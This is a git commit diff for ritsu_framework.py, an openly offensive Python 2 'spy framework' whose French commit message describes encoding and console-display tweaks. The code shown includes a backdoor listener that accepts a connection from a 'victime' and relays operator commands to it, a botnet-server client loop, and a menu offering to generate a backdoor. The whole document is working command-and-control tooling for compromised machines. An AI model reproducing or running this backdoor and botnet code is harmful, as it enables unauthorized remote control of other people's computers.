297b6af367879c956c0cfe30f49cbf567002fe24
Tracks <anon.dark97@gmail.com>
2017-04-07 00:25:22 +0200

    MàJ
    Spécification d'encodage au lancement, et optimisation du rendu graphique console ainsi que des sélection de choix de fin de programme

--- ritsu_framework.py
+++ ritsu_framework.py
@@ -1,7 +1,9 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+
 import socket
 import sys
 import threading
-
 
 def listenbackdoor():
 	listening = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -9,11 +11,11 @@ def listenbackdoor():
 	port = input('your port: ') 
 	listening.bind((host, port))
 	print "listening on address: " + str(host) + "on port: " + str(port)
-	while True:
+	while(True):
 		listening.listen(5)
 		(victime, (address, his_port)) = listening.accept()
 		print "victime: " + address
-		while True:
+		while(True):
 			interact = raw_input('Ritsu_>:')
 			victime.send(interact)
 			data = victime.recv(1024)
@@ -29,36 +31,32 @@ def connectto_b0tnet(): #pas encore au point mais j'y travaille
 		connection.connect((server, server_port))
 	except:
 		print 'ip and port not available please retry bye ;) '
-	while True:
-		
+	while(True):
 		interaction = raw_input('Ritsu_b0tnet_>:')
-		if interaction != "":
+		if(interaction != ""):
 			connection.send(interaction)
 			data = connection.recv(1024)
 			print data
-		elif interaction == "list":
+		elif(interaction == "list"):
 			connection.send(interaction)
 			data = connection.recv(1024)
 			print data
-		elif interaction == "exit":
-			connection.close()
-print('__________ .__   __                  ')
-print('\______   \|__|_/  |_   ______ __ __ ')
-print('|       _/|  |\   __\ /  ___/|  |  \'')
-print('|    |   \|  | |  |   \___ \ |  |  /')
-print('|____|_  /|__| |__|  /____  >|____/ ')
-print('        \/                 \/        ')
-print('spy_framework.py v1.00 \n')
+		elif(interaction == "exit"): connection.close()
 
-print '1) listening (backdoor)'
-print '2) connect to the botnet server'
-print '3) generate backdoor'
+print(
+'__________ .__   __                  \n'
+'\______   \|__|_/  |_   ______ __ __ \n'
+'|       _/|  |\   __\ /  ___/|  |  \\ \n'
+'|    |   \|  | |  |   \___ \ |  |  /\n'
+'|____|_  /|__| |__|  /____  >|____/ \n'
+'        \/                 \/        \n'
+'spy_framework.py v1.00 \n\n'
+'1) listening (backdoor)\n'
+'2) connect to the botnet server\n'
+'3) generate backdoor\n')
 
-command  = input('your task?')
+command  = input('your task? ')
 
-if command == 1:
-	listenbackdoor()
-elif command == 2:
-	connectto_b0tnet()
-elif command == 3:
-	generate_backdoor()
+if(command == 1): listenbackdoor()
+elif(command == 2): connectto_b0tnet()
+elif(command == 3): generate_backdoor()
